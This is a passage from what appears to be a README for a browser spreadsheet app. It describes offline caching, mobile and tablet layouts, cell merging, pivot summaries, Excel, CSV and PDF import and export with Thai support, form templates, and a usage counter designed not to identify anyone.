you to find out. That is the decision everything else follows from: what you are looking for in a
spreadsheet is usually what you typed, and what you mean to replace is always what you typed —
rewriting a formula's result would mean writing a number over the formula that produced it. So
`=SUM(B1:B9)` is found by searching `SUM`. The cost, stated in the panel, is that searching `4500`
does not find a cell showing `4,500` that a formula produced.

Match case, whole cell, and all sheets. `Enter` and `Shift+Enter` step forwards and back, wrapping,
and Find Next walks the sheet in reading order rather than nearest-first — pressing it ten times
should go where your eye would, and a list that reorders itself around the cursor makes the tenth
press a surprise. **Replace all is one undo step**, because a hundred entries in the history for one
button press means pressing Ctrl+Z a hundred times to find out what it did.

It deliberately preempts the browser's own find bar, which searches the DOM — and the DOM holds the
forty rows the grid has decided to render, so on a five-thousand-row sheet it would report "not
found" for text that is plainly there.

### 📴 Opens with the network off

The pitch has always been that the spreadsheet lives in your browser and is never uploaded. That
was true, and the app still could not open on a train — the document was local and the *program*
was not. A fair thing for someone to hold against it.

A service worker now caches the app itself, and a manifest lets it go on a home screen. Install it
and `/app` opens with no network at all: the grid, the engine, the 65 functions, import and export,
and whatever was autosaved in `localStorage`.

**What the caching policy is, and why each part of it:**

| | Policy | Because |
|---|---|---|
| Navigations (`/app`, `/`) | Network first, cache as fallback | A stale HTML document carries the CSP nonce and the script URLs of a build that may no longer exist. Offline it is served whole — response and headers together — so its nonce still matches its own inline scripts |
| `/_next/static/*` | Cache first | Content-addressed: a given URL never changes what it holds, so a hit is always correct and a miss is a new build |
| `/api/*`, the assistant, live data, Supabase | **Never cached** | These are the parts that *need* the network. A cached answer from them is a stale number presented as a current one, which is this project's least acceptable failure |

**What still needs a connection**, since an app that quietly does less offline is worse than one
that says so: the AI assistant, live data blocks (the cell keeps its last value and says when it
was fetched), cloud save, and live editing.

The worker is about a hundred lines, hand-written, and in the repository where you can read it —
[`public/sw.js`](public/sw.js). A generated one would be a few hundred lines nobody here could
answer questions about, and the caching policy is the only interesting decision in it.

It does not register in development, which is deliberate: a worker caching the app shell is exactly
what makes a code change appear not to have happened, and that costs an afternoon the first time.

No screenshot: the install prompt is the browser's own chrome and looks different in every one of
them. The e2e gate covers it instead — it registers the worker, switches the network off, reloads,
and checks the grid is there rather than an error page.

### 📱 Works on a phone

Opening this on a phone used to show **not one cell of the spreadsheet** — the 320px side panel
squeezed the grid down to its row numbers, and the toolbar wrapped into three rows that ate 380px
of an 844px screen before the grid began. All three are fixed:

| Thing | What it does on a phone |
|---|---|
| **Formulas / AI / live data / cloud** | A **tab bar along the bottom with a name on every tab**, where a thumb reaches. A panel rises as a sheet that **stops short of the top**, so the first rows and the selected cell stay in view, and stops above the tab bar, so the next panel is one press away · **starts closed** so the sheet is what you see first |
| **Top row** | Four things: the name · undo · redo · language — **nothing past the edge**. The rest (import, export, add row/column, connecting an API) is in a **menu** with a name on every line |
| **Formatting row** | Bold · italic · underline · alignment · colour · **Tools**, which fits 390px. The rest (number format, merge, freeze, sort, rules, charts, pivot) is in a **cell tools sheet**, every button named |
| **Editing a cell** | **Tap to select, tap again to edit** — it previously needed a double-click, which a phone cannot do, so nothing could be typed at all · The second tap puts **the caret at the end of the text** rather than selecting it all (the first letter typed used to wipe the cell) |
| **Tap targets** | 44×44 everywhere, in both bars (up from 28px — and five format-bar buttons were still only 32px wide until a later measurement caught them) |
| **Selecting a range** | A **grip on the selection's bottom-right corner**, dragged to pull the range out — its touch target is 44×44 while the dot you see stays small |
| **Copy / paste / fill down** | **A row of commands above the sheet tabs** — see [Copy, paste and fill down with a finger](#-copy-paste-and-fill-down-with-a-finger) |
| **Hover-revealed buttons** | Shown permanently where nothing hovers — otherwise the column filter and the delete-sheet button are invisible |

![On a phone](public/screenshots/en/19-mobile.png)

**Why the phone toolbar was taken apart.** It used to be one row of bare icons that scrolled sideways. It
passed every gate (44px targets, names for a screen reader, no sideways page scroll), and **the person who
wrote the app opened it on their phone and could not find where to connect an API.** Σ, a sparkle, a
cylinder and a cloud say nothing, half the row was off screen, and the cloud was read as "connect a
database" when it is cloud save. Now **every button on a phone has a name and nothing has to be scrolled to.**
What it covers is kept in check: the top row lost as much height as the tab bar adds, the tab bar hides
while a keyboard is up, and every sheet closes itself once a tool is pressed, so the result is on the grid.

<table>
<tr>
<td align="center"><b>The menu — the way to an API or database is its first line</b><br>
<img src="public/screenshots/en/44-mobile-menu.png" width="300"></td>
<td align="center"><b>The cell tools sheet — every formatting tool, named</b><br>
<img src="public/screenshots/en/45-mobile-cell-tools.png" width="300"></td>
</tr>
</table>

The buttons in the cell tools sheet are **the same elements as the desktop row, not copies**: the box around
them is `min-[1366px]:contents`, so from 1366px up it dissolves back into the row, from 1024 to 1365px it is a
panel dropped under the bar ([tablets](#-tablets-and-folding-phones)), and on a phone it becomes the sheet.
A screen reader and the gates see one set of names. `check:a11y` opens both sheets and scans them at 390px,
and one e2e flow asks plainly: "at 390px, is the way to live data on screen and named?"

**Dragging out a range with a finger** — a mouse sweeps a range by holding the button down and
moving, but on a phone dragging a finger across the grid is how you scroll it, and taking that over
would trade one ordinary gesture for another. So touch gets what every mobile spreadsheet gives it:
a **grip on the corner of the selection**. Only the grip takes the drag, so the rest of the sheet
still scrolls normally, and **dragging to the edge scrolls the sheet to meet the finger** — without
that a range could never be bigger than the screen, which on a phone is a handful of columns.

<p align="center"><img src="public/screenshots/en/21-touch-select.png" width="320"></p>

The grip appears only where `(pointer: coarse)` matches. On a mouse it would sit under the cursor
looking like Excel's fill handle while doing something else entirely.

Desktop behaviour is **unchanged**: the panel still sits beside the grid, and clicking an already
selected cell still does *not* start editing — you double-click, as in Excel. The tap-again rule is
tied to `pointerType === "touch"` rather than guessed from screen width.

**Measured** at 360×780: the toolbar used to wrap onto three rows, putting the first cell **51% of the
way down the screen**. As one scrolling row that is **38%** — 12 visible data rows up to 15 — while desktop
stays where it was, at 24%.

**Hiding a button until hover is a bug on a phone.** The column-filter button and the delete-sheet button
used `opacity-0 group-hover:opacity-100`, and a touch screen has no hover: they were **permanently
invisible** — still clickable, but with nothing to say they existed. The delete-sheet button now has
`pointer-coarse:opacity-100`, shown wherever hovering doesn't exist · **The filter button is now shown on every
device**: the blind test found that on a desktop, too, nobody knew a column could be filtered until the mouse
happened to rest on it.

**Not supported yet:** the row/column context menu needs a long press, which some mobile browsers
answer with their own menu.

### 👆 Copy, paste and fill down with a finger

With a mouse these are `Ctrl+C`, `Ctrl+X`, `Ctrl+V`, `Ctrl+D` and `Delete`. A phone has no keyboard to press
them on and no right-click, and in the blind test "copy *yes* down ten rows" **could not be done at all**. There
is now a row of five named commands — **Copy · Cut · Paste · Fill down · Clear** — above the sheet tabs.

<p align="center"><img src="public/screenshots/en/51-touch-actions.png" width="320" alt="A phone with five cells of column B selected, and the copy, cut, paste, fill down and clear row above the sheet tabs"></p>

- **A row of its own, not floating** — floating, it sat exactly on the sheet tabs
- **Shown only where `(pointer: coarse)` matches**, and **gone while the keyboard is up or a panel is open** —
  the two moments it would cover what someone is using
- **The clipboard is the app's own**, the one `Ctrl+C` fills, so a copy here pastes with the keyboard and back
- Paste is disabled until something is copied · Fill down needs at least two rows (the top one is what fills) —
  a button that does nothing when pressed is worse than one that says it cannot be pressed yet

**Not supported yet:** pasting the system clipboard (text copied in another app) from this row — mobile browsers
ask permission every time, so it uses the app's clipboard only.

### 📲 Tablets and folding phones

On a Galaxy Z Fold7 opened out, the toolbar **scrolled off the edge of the screen** — a width wider than a phone
and narrower than a laptop, and the layout had only two shapes: below 640px, and everything else. At 1024px the
top row overflowed by 251px, and what it pushed off the edge was "Ask AI". There are now three ranges, each
boundary picked at a width **measured to fit in both languages**:

| Width | What you get |
|---|---|
| **Below 1024px** (phones, a Fold opened out, tablets upright) | The [phone](#-works-on-a-phone) layout: a named tab bar, the menu as a sheet, cell tools as a sheet |
| **1024–1365px** (tablets sideways, small laptops) | Named panel buttons in the top row · **the menu drops as a panel under its button** · the formatting row keeps B I U, alignment and colour, and **Tools** opens a panel under the bar · from **1280px**, **Import file** and **Export Excel** are back in the row |
| **1366px and up** | Everything in the row, as before |

<p align="center"><img src="public/screenshots/en/53-tablet-tools.png" width="640" alt="At 1024px the cell tools panel drops from the Tools button, every tool named"></p>

**Measured** at 360 / 390 / 640 / 820 / 1024 / 1280 / 1366 / 1440px in Thai and English: **no bar overflows by a
single pixel**, and `check:a11y` checks for sideways scroll at five widths on every push · The first cut moved all
four file buttons into the menu below 1366px, and e2e went red: at 1280px, the most common laptop width, every
export would have cost two presses. There was room for the two that get used, so those two came back.

### ➕ Insert/delete rows & columns

Right-click a row/column header to insert or delete. The app **automatically rewrites every formula in the
sheet to reference the new correct positions**; a formula that referenced the exact row/column that got deleted
turns into `#REF!`, exactly like Excel.

<p align="center"><img src="public/screenshots/en/26-insert-row.png" width="820"></p>
<p align="center"><sub>Insert a row at 3 and <code>=SUM(C2:C4)</code> becomes <code>=SUM(C2:C5)</code> by itself — no chasing formulas by hand</sub></p>

### 🔗 Merging cells

A report title spanning the width of a table is almost always a merged cell. This app already **read**
merges out of an imported file and wrote them back on export — it just couldn't make one. Select a range
and press **Merge** in the format bar.

<p align="center"><img src="public/screenshots/en/30-merge-cells.png" width="900"></p>

**One button, both directions.** A selection touching a merge turns the button into **Split**; one that
doesn't leaves it as **Merge**. Two separate buttons would mean one of them is always the wrong one to
press. It's disabled on a single cell, because one cell isn't a merge.

The button sits **next to the number format**, not at the end of the bar — merging is cell formatting, so it
belongs with bold, alignment and number format. It was first placed last, after the charts button, which on a
phone meant scrolling almost the whole bar to reach it (measured at 645px into a 725px bar).

**Selecting half of an existing merge swallows the whole thing.** Half a merge is not a thing that exists,
so the new range grows until it contains every merge it touches — and grows again if swallowing one brings
it against another. That's what Excel does. Splitting is the mirror image: touch any part of a merge and
the whole merge goes.

**Only the top-left value survives**, which is the one genuinely destructive thing here, so it **asks
first — but only when there is something to lose.** If the other cells are already empty it just merges.
A confirm dialog that fires every time is a dialog that teaches people to click through without reading.
(And undo is still there if you do.)

Merges already follow inserted and deleted rows and columns, and they **reach the exported `.xlsx` as real
`<mergeCell>` elements** — checked by unzipping the export and reading the XML directly rather than
through our own reader.

**Not supported yet:** vertical centring inside a merged cell, and dragging a selection out from a merged
cell still measures from its top-left corner.

### 🔤 Sort and filter

- **Sort** (A-Z/Z-A): selecting a single cell auto-detects the surrounding table bounds, and skips the header
  row automatically if it detects text sitting above numeric data.
- **Filter**: the funnel icon on each column header lets you check/uncheck which values to show, hiding rows instantly.

### 🧮 Pivot (summarise a range)

Select a range whose first row is the header, press **"Summarise (Pivot)"**, then choose which columns to
group by (more than one is fine), which column to fan out across the top, and what to summarise — sum, count,
average, min or max. The field buttons are named from **the first row of the range you actually selected**,
not A/B/C, so nobody has to translate column letters into headings in their head.

<p align="center"><img src="public/screenshots/en/28-pivot-panel.png" width="820"></p>

The result is a **new sheet**, not a special object you can't touch: sort it, filter it, chart it or export it
like any other data. The header and the grand-total row are bolded, because those are the two rows a reader
scans for first.

<p align="center"><img src="public/screenshots/en/29-pivot-result.png" width="820"></p>

Details that were worth getting right:

- **The totals row re-aggregates the raw values instead of adding up the cells above it.** An average of
  averages is not the average; summing what's on screen would print a number wrong in a way nobody questions.
- **A group with no numbers gives a blank, not 0.** "Nothing here" and "adds up to nothing" are different
  answers.
- **Groups sort numerically when the labels are numbers**, otherwise by locale — so Thai sorts as Thai rather
  than by code point — and blank groups always sink to the bottom.
- **A row that is blank in the grouping column but carries a number** still counts, as a `(blank)` group,
  rather than being dropped silently.

**A summary remembers where it came from, and says when the source moves.** The sheet keeps the range it
read, the fields that were picked, and a fingerprint of the values at the time. Change the source and a
notice appears on that sheet with a **Refresh** button — one press, instead of going back, re-selecting the
range and re-picking every field.

<p align="center"><img src="public/screenshots/en/31-pivot-refresh.png" width="900"></p>

**Deliberately not live.** The result is an ordinary sheet you can sort, chart and edit; one that rewrote
itself whenever a source cell changed would throw that away, and throw it away inside someone else's undo
history. Excel refreshes pivots on request for the same reason. Nothing is shown while it is up to date —
a banner that is always there is a banner nobody reads.

If the source sheet has since been deleted, the notice says it can't be refreshed rather than offering a
button that does nothing.

**Not supported yet:** refreshing is manual, not automatic; a refresh overwrites anything typed into the
summary sheet; one column field at a time; and the summary sheet has no filters of its own.

### 📑 Multiple sheets in one file

Switch/add/rename/delete sheets from the tab bar below the grid. Each sheet has independent data, formulas, and
formatting, but **undo/redo and autosave cover every sheet together**.

<p align="center"><img src="public/screenshots/en/05-sheet-tabs.png" width="820"></p>

### 📥 Import an existing Excel file

Reads every cell's value plus its **original formulas** into the grid and recomputes everything immediately; a
multi-sheet file imports as separate tabs. The file's **look** comes too — colour bands, font sizes, borders,
row heights, merged cells — see [It looks like the file you opened](#-it-looks-like-the-file-you-opened), and
if the file was built as a form, [Templates from an Excel file](#-templates-from-an-excel-file).

**A formula filled down or across in Excel stays a formula in every cell.** Excel stores a filled
range as a *shared formula* — the first cell holds the text, the rest only point back at it — and each
cell gets its references moved by the same shift the fill handle uses: `$` references stay put, and
text in quotes that happens to look like an address (`"Q1"`) is left alone.

**The sheet is sized from the last row and column the file actually uses.** A blank separator row does
not cost the rows after it, and the empty rows a form still needs count too — unlocked cells on a
protected sheet, and cells under a validation rule — so they survive opening, saving and exporting. A
rule on a *whole column* (`A:A`) means "every row", so it applies to every row the sheet has rather
than stretching the sheet to a million.

> **Ceiling:** an import opens at most **100,000 rows** and **2,600,000 cells per sheet** (so a wider
> sheet gets proportionally fewer rows — 260 columns get 10,000). In memory a sheet is a full grid,
> so the cost is rows × columns: measured, 100,000 × 26 builds and computes in under a second, while
> 200,000 × 26 took nearly three seconds and about 780 MB. A longer file is opened as far as the
> ceiling allows, and **the app says so at once** — which sheet, the row the file reaches, and how many
> rows were opened. Nothing is cut silently.

### 🛟 Opening a file without losing your work

**Importing used to replace the whole workbook at once, without a word.** In the blind test someone opened a
file to look up one number and lost nearly an hour of typing. Now, when there is work open, the app **asks first**:

<p align="center"><img src="public/screenshots/en/50-import-choice.png" width="820" alt="A dialog asking how the file should open: add its sheets after the current work, or replace the open work"></p>

- **Add as new sheets after your work** — focused from the start, so someone who presses Enter without reading
  loses nothing. A sheet whose name clashes with one already open becomes `Name (2)`, and **the file's own
  formulas that point at it are rewritten to match** rather than landing on your sheet
- **Replace what is open** — the old behaviour, with a red icon and the number of sheets it will close
- **Cancel** / `Escape`

Afterwards a green bar says what happened, with an **Undo** button that takes the whole import back in one press
(`Ctrl+Z` works too). **It does not ask** when the screen holds only the sample or empty sheets — a question with
nothing at stake is the one that teaches people to click through without reading.

### 🆕 A blank start, and New file

<p align="center"><img src="public/screenshots/en/55-blank-start.png" width="700" alt="A first visit: a blank sheet, and the green bar with Try it with sample data"></p>

- **The app opens on a blank sheet**, with a green bar offering **Try it with sample data**: nine sample
  rows in the language on screen, undone with undo. The bar goes the moment the grid holds anything —
  the same moment opening the sample would start costing somebody their work.
- **Returning visitors** — a browser that saved the untouched sample (everybody who opened the app before)
  opens blank too. The comparison is byte for byte: one changed cell, row or sheet makes it their work,
  and it stays.
- **New file** — an icon before Import from 1024px, and the first line of the menu's File group. Over
  work it asks first, with **Export Excel first** under the cursor (so Enter is the harmless answer);
  confirming leaves one blank sheet, and Ctrl+Z brings the work back. With nothing to lose it does not ask.

<p align="center"><img src="public/screenshots/en/56-new-file.png" width="700" alt="The question before a new file: Export Excel first, Start a new file, or Cancel"></p>

**Limits:** on a wide screen New file is an icon only (its name is the tooltip and what a screen reader
says), because the top row was measured to the pixel at 1280 and 1366 in both languages. Undo lives in
this tab: close it and replaced work does not come back, which is why export is offered first.

### 🧩 Drag-and-drop formulas

Search/filter by category (Math / Statistics / Logic / Text / Date / Lookup), then **drag** or **click** a
formula card to open the parameter panel, complete with a crosshair button to click/drag-select cells from the
grid instead of typing an address by hand. Choose to apply it to **this cell only / the whole row / the whole
column / the current selection** — relative references adjust automatically like Excel's fill handle (absolute
references with `$` stay put).

A **Common** category comes first, and the seven formulas people actually reach for (`SUM` `AVERAGE` `COUNT` `IF`
`SUMIF` `VLOOKUP` `XLOOKUP`) lead the "All" list — sorted by category, `SUMIF` used to sit past a dozen formulas
hardly anyone uses.

<table>
<tr>
<td width="50%" align="center"><b>Parameter panel</b><br><sub>Pick range C2:C4 straight from the grid instead of typing the address</sub><br><br>
<img src="public/screenshots/en/02-formula-panel.png" width="400"></td>
<td width="50%" align="center"><b>Result the moment you confirm</b><br><sub><code>SUM(C2:C4)</code> computes to 165</sub><br><br>
<img src="public/screenshots/en/03-after-insert.png" width="400"></td>
</tr>
</table>

### 📤 Export

- **Excel**: a single `.xlsx` with **every sheet** included — original formulas, formatting (fills, font sizes,
  borders, row heights, column widths, merged cells) and a template's locking all intact, so it opens in
  Excel/Google Sheets as the file it was rather than as computed numbers. **A formula the engine cannot read
  goes out as text** — it is an error in the app already, and the file should not promise more than the app showed.
- **CSV**: the currently open sheet, as computed values, with the BOM Excel needs to read Thai
  (see [CSV in and out](#-csv-in-and-out)).
- **PDF**: the currently open sheet only, showing computed values with row/column headers, with the
  charts following underneath.

  **Thai reads, because the font goes with it.** jsPDF ships only the standard PDF fonts, and not
  one of them contains a Thai vowel or tone mark — so every Thai label used to come out as
  unrelated Latin glyphs. **Noto Sans Thai** (OFL, ~45KB) is now embedded, fetched from
  `public/fonts/` at export time rather than bundled: nobody who never presses Export PDF downloads
  it at all. If the fetch fails it falls back to the built-in font instead of failing the export.

  **Stacked tone marks now land correctly** (ที่, นี่, ดื่ม, ซื้อ). jsPDF applies no OpenType mark
  positioning, so a tone mark and the upper vowel under it were drawn at the same spot and merged —
  `ที่` came out as `ที`. `thaiMarks.ts` finds the marks that follow an upper vowel and
  `pdfExport.ts` draws each one again 0.19em higher. That figure was measured, not guessed: the same
  words rendered in a browser (which shapes them properly) leave a 0.047em gap, and the rise that
  reproduces it is 0.19em. A mark over a *lower* vowel (`ผู้`) or straight on a consonant (`ป่า`)
  is left where it was.

  > **Not supported:** the rest of Thai shaping — the lowered marks that tall consonants (ป ฟ ฬ)
  > want, the narrowed forms after ญ and ฐ. One rule that fixes what was actually unreadable beats
  > half a shaping engine.

**Printed, it now reads like a report rather than a pile.** The export used to produce *a*
document: portrait unless there were more than eight columns, eight-point type whatever the width,
the column letters as the only heading, and no page numbers — so a twelve-page export was twelve
loose sheets with nothing on them to say which came first.

- **Type is sized from the sheet's width**, measured against A4's usable 182mm portrait and 269mm
  landscape rather than guessed. A twenty-column sheet at 8pt runs off the page; a four-column one
  at 5pt is unreadable for no reason. It stops shrinking at 5pt, because past that the page says
  nothing whatever the size and going smaller only makes the document look like it is hiding
  something.
- **The rows you froze are repeated at the top of every page.** Somebody who froze two rows has
  already answered "which rows are the heading"; asking again in a dialog would be asking twice.
  Capped at three — a heading that fills a quarter of every page is not a heading.
- **Page numbers**, in the language the app is in.

**There is no page-setup dialog**, and that is a stopping point rather than an oversight: the
defaults are right often enough that the dialog would mostly be a thing to click through. Margins,
a chosen scale and a print range are the parts a dialog would add, and they are not here.

### 🔀 CSV in and out

CSV is the format every other tool speaks — a bank statement, a POS export, the file a colleague mails you.
Opening one here used to mean opening it in Excel first and saving it as `.xlsx`, which made this app the long
way round for the most common file there is. The **Import file** button now takes `.csv` directly, and
**Export CSV** sits beside the other two exports.

Three details decide whether this works on real files rather than only on the ones we write:

| Thing | What it does, and why |
|---|---|
| **The delimiter isn't always a comma** | Excel writes the list separator of the machine's locale, so a file saved in Thailand or most of Europe is semicolon-separated. Guessing comma doesn't fail loudly — it loads the whole row into column A, which looks like a broken app rather than a wrong guess. Candidates are counted **outside quotes** and the winner wins (`,`, `;` and tab). |
| **A BOM is what makes Thai readable in Excel** | Without one, Excel on Windows guesses a legacy code page and every Thai file opens as mojibake. It's stripped on the way in and written on the way out — three bytes between a usable export and a bug report. |
| **Quoting is the format** | A field holding the delimiter, a quote or a newline has to be quoted with inner quotes doubled. A parser that splits on the delimiter is wrong the first time an address or a Thai note contains one. |

**Computed values on export, not formulas and not formatted text.** CSV has no formulas, so writing `=C2*D2`
hands the next reader a text field that means nothing. Numbers go out as `1234` rather than `฿1,234.00`:
on screen the thousands separator helps, but in the file it is a second delimiter that makes the column
unparseable.

**The active sheet only**, named after its tab — a CSV holds one table, and both stacking three sheets into
one file and splitting them into three are surprises.

**CSV injection is neutralised.** A value beginning `=`, `+`, `-`, `@`, a tab or a newline is written with
a leading apostrophe, which every spreadsheet reads as "the rest is text" — **and numbers are never touched**.
Prefixing every field that starts with `-` would mangle every negative number in every export, which is how
this mitigation usually gets reverted a week after it ships. On import the apostrophe this app added comes
off again, so a file exported from here and read straight back is unchanged.

**Not supported yet:** files that aren't UTF-8 (TIS-620 out of an older system, say) come in as mojibake —
there's no encoding detection. And a field that genuinely began with an apostrophe and an `=` in someone
else's file is indistinguishable from one this app escaped, so it loses that apostrophe on the way in. CSV
has no way to say "text that happens to look like a formula", so something has to give.

### 🎨 It looks like the file you opened

<p align="center"><img src="public/screenshots/en/17-styled-import.png" width="820"></p>

Real Excel files lean on **coloured header bands, large type, rules and row banding**. Import that
as bare numbers and people don't recognise their own file. The screenshot above is an imported
`.xlsx` with no formatting applied inside the app at all.

| From the file | Read in |
|---|---|
| Background fills (colour bands) | ✅ including alternate-row banding |
| Font size | ✅ large or small, as the file has it |
| Bold / italic / underline | ✅ |
| Font colour | ✅ |
| Borders (top/right/bottom/left) | ✅ with their colour — a rule from the file wins over the grid's own faint line |
| Vertical alignment | ✅ top / middle / bottom |
| Row heights · column widths | ✅ |
| **Merged cells** | ✅ a heading spanning several columns stays one band instead of breaking apart |
| Number formats (currency/%) | ✅ (already supported) |
| Original formulas | ✅ (already supported) recomputed immediately |

All of it **exports back to `.xlsx`**, so the file opens in Excel as the file it was.

> **Not supported:** images and charts in the sheet, specific font families
> (the system font is used), and arrowing into a cell a merge has swallowed — that cell no longer
> exists in the DOM, though the merged band itself clicks normally.

### 📋 Templates from an Excel file

<p align="center"><img src="public/screenshots/en/15-template.png" width="820"></p>

A form someone already built in Excel — a quote, a requisition, a data-entry sheet — **already says
which cells are meant to be filled in**. Excel locks every cell by default, and whoever built the
form deliberately unlocked the fields. That gets read straight back, so **nothing has to be marked
up again**.

| In the file | In the app |
|---|---|
| The sheet is protected | Template mode, with an amber bar saying how many fields there are |
| An unlocked cell | A field — amber outline, editable |
| A locked cell | The template's structure — dimmed, read-only |
| A data-validation list | Click and choose, rather than a blank text box |
| Column widths | Applied, so the form still looks like the form |
| Formulas in the form | Compute over what was typed (`=B5*B6` feeding `=B7*1.07`) |

<p align="center"><img src="public/screenshots/en/16-template-dropdown.png" width="820"></p>

**Every route in is guarded**, not just typing: Delete, paste, sorting, and adding or removing
rows and columns are all refused *with a reason* — silently doing nothing reads as the app being
broken rather than the template doing its job.

**But you're not trapped in it** — "Unlock the sheet" makes every cell editable like an ordinary
sheet, and Ctrl+Z brings the template back (the template state lives inside `sheets`, so it sits
under undo and autosave like any other content).

**Export puts the template back together**: the exported .xlsx is protected again, with the same
cells unlocked, the dropdowns re-attached and the column widths intact — open it in Excel and it's
still a form.

> **Not supported:** *authoring* a template inside the app — this reads templates from files that
> already are one. (Merged cells and conditional formatting were both on this list once; both have
> since shipped.)

### 📊 A usage count that provably cannot identify anyone

The smallest useful question is **"has anyone actually used this, or am I looking at my own
visits?"**, and it sits against the sentence the landing page leads with — so the shape of the
answer is the argument, not a footnote to it.

**Off unless `NEXT_PUBLIC_USAGE=1`.** A clone of this repo sends nothing, ever, and there is no
default endpoint to forget to unset. The flag is checked again in the route, so a post to a
deployment that said no is refused rather than quietly recorded — and a `check:e2e` flow drives
every act that is wired to count, on an ordinary build, and asserts that **zero** requests reach
`/api/usage`, because "this bundle sends nothing" is a claim about the build rather than about a
function.

**The event name is the whole payload, and it comes from a fixed list of seven.** This is the
load-bearing part rather than a tidiness preference: the policy already lets the page talk to its
own origin, so a free-text field here would be a ready-made way for a bug — or an injected script —
to post a cell's contents somewhere and have it look like telemetry. A closed union cannot carry a
spreadsheet. The same list is checked in the browser, again in the route, and a third time in SQL,
and only the third is one an attacker cannot skip by not using the browser.

| Event | Fires when |
|---|---|
| `landing_viewed` | The front page (`/`) loads — a page load, not an act, counted apart from `app_opened` so the two say how many visits went on to open the app |
| `app_opened` | `/app` loads — also a page load rather than an act |
| `formula_entered` | A formula is typed (which formula is none of its business) |
| `file_imported` / `file_exported` | A file comes in, or xlsx/PDF/CSV goes out |
| `ai_asked` | The assistant is asked — counted before the branch, so it reads the same whether the request goes through this app's server or straight from the visitor's own key |
| `live_data_inserted` | A live block is placed (not the refreshes that follow, which would measure the poller rather than the person) |

**At most once per event per page load**, held in memory and never written down, so there is no id
to persist and nothing to correlate across visits. It also changes what is being measured, on
purpose: *did this happen at all*, not *how many times* — a per-keystroke counter is a behavioural
trace wearing a number's clothes.

**No time of day, no IP, no user agent, no referrer, no cookie, no session.** A request carries the
first four whether anyone wants them or not; what matters is that none are kept, and the route's
tests send all four and assert that what reaches storage is the event name alone. (The user agent is
the one that is *read* — to turn bots away, below — and it goes when the request does.) The day is
stamped by `current_date` in the database, because a date that travels over the wire is a field
somebody eventually makes more precise, and an exact time plus a rare event is an identifier.

**Do Not Track and Global Privacy Control are honoured**, because an app arguing that it does not
take your data does not get to ignore the browser saying the same thing.

**A browser that says a program is driving it is not counted.** In the first week in production,
*every* figure came from one crawler's headless Chrome — the one number this feature exists to keep
out. The browser does not send when `navigator.webdriver` is `true` or its user agent contains
`HeadlessChrome`, and the route checks the request's user agent for the same word again, for a bot
that never runs the page's script at all. **The limit, stated plainly:** a bot that goes to the
trouble of looking like a person (a changed user agent, the webdriver flag switched off) is still
counted. This filters the ones that say what they are; it does not claim to catch the rest.

What is stored is `(day, event) → count`. The table has row-level security on and **no policy of
any kind** — deliberately, so the key the server holds cannot read a row back; it may call
`bump_usage` and nothing else. With no Supabase project configured it writes one structured line a
log drain can count, which on a host that keeps logs for an hour is worth exactly that much, and is
said here rather than left to be discovered.

**A write that does not land has to say so.** The first version caught every error into an empty
`catch {}` and never looked at `res.ok` at all, so a write that landed, a 401 from a key the host
had not applied, and a 404 from a project that had never run the migration were three different
things producing three identical non-events: no log line, no error, a 204 to the browser, and an
empty table. Working out which one it was took ten rounds of reading deploy logs for a fact the
function had known all along and thrown away. A failure now costs one `console.warn`, shaped
`exceltogo.usage.failed <event> <reason>`, where the reason is `http_401`, `bad_key` or an error's code
(`ECONNREFUSED`) and **never an error's message** — a `fetch` failure puts the host it could not
reach in its own, and this is the one function in the codebase holding an API key, so the reason is
forced through `[A-Za-z0-9_]{1,32}` and anything else is reported as `unknown`. (The test for it
hands the error a connection string as its `code` and asserts the line does not contain it.) The
endpoint still answers 204 either way: a counter that can break the thing it counts is worse than
no counter.

**`bad_key` came from production, not from reflection.** With the fix above deployed, the Vercel log
did speak — and said `TypeError` and "no outgoing requests", which is true and no help, because a
dozen causes share that name. Reproducing each paste mistake against the real code narrowed it to
one family: **a key holding a character HTTP will not put in a header** — a line break from the
paste, a `…` from copying while it was displayed truncated, an invisible character. The key is now
checked first for printable ASCII without whitespace, and anything else is reported as `bad_key`.
The rule is *what HTTP itself refuses* plus whitespace, not a guess at the provider's key format:
guess the format, and a format change on their side turns a working deployment into a confident,
wrong `bad_key`.

**What it cannot tell you**, written down so nobody reads more into a number than is in it: how many
*people* (two visits from one person and one each from two are the same number), whether anyone came
back, where they came from, or anything at all about a single visit.

### 🏠 A landing page that explains the app

`localhost:3000` now opens on a page describing what the app does, with an **"Open the app"** button through
to `/app` — where before you landed straight in a bare grid with nothing telling you how to use it. Every
screenshot on it comes from the running app rather than a mockup, and it goes through the same message
dictionary as the app, so the language you choose there carries through with you.

**The table in the hero is not a screenshot — it is the engine.** `LiveSheet` imports the same
`parseFormula` and `evaluate` the app runs on, so double-clicking a price recomputes `=B2*C2` and
`=SUM(D2:D5)` in the visitor's browser. A spreadsheet product whose front page shows a *picture* of a
spreadsheet is asking to be taken on trust; this asks for ten seconds instead. It also keeps itself
honest: if the engine regresses, the front page visibly breaks.

<p align="center"><img src="public/screenshots/en/25-landing.png" width="820"></p>

**The old pitch said nothing.** "Open Excel and keep working in the browser" is what Google Sheets and Office on
the web already do, for free, for millions of people. The page now answers that objection directly, straight after
the problems — the moment a reader has recognised their own and thinks "but Sheets does that" — instead of hoping
they read far enough to find the difference themselves. Every row is a
checkable fact — and **the row this app loses is in the table too**, because a comparison the author wins
outright is one nobody believes.

<p align="center"><img src="public/screenshots/en/32-landing-compare.png" width="900"></p>

**The first section stopped being a feature list — twice.** It used to read "formula syntax you can't
recall", "mistyped cell addresses" — capabilities dressed up as problems, which nobody reads and thinks
*that is me* — so it became situations told as situations. But problems and features still lived in
separate sections: the problems had no pictures, and the features never said what they were for. Now
they are one: **[six problems a team already pays for](#-problems-it-solves)**, each written as a ledger
entry — who has it · **what it costs now, in red ink** (the only place the page uses that colour for
words) · the features that solve it as lines a, b, c, because one problem is usually solved by several
working together · and **the outcome under a double rule**, the way an account closes its total. Beside
each, a proof from the running app stays on screen while the entry is read, and opens full size. An
index of all six sits on top, so the person who runs payroll reaches their problem in one press.

<p align="center"><img src="public/screenshots/en/38-landing-problems.png" width="900"></p>

The page is laid out as **ledger paper** rather than as a stack of rounded cards: hairline rules instead
of boxes, square corners, the alternating pale-green row bands of accounting paper, monospace with tabular
figures for every number, formula and cell address against a sans for prose, and one inverted band through
the middle as a spine. There is not a single gradient on it.

The whole app moved to **IBM Plex Sans Thai** with **IBM Plex Mono**. It had declared Geist, but
`globals.css` overrode that with `Arial` anyway — and Geist carries no Thai glyphs at all, so every
Thai character fell back to whatever the OS offered and the same page looked different on Windows
and macOS. Plex Mono has no Thai either, so the `font-mono` stack names Plex Sans Thai after it:
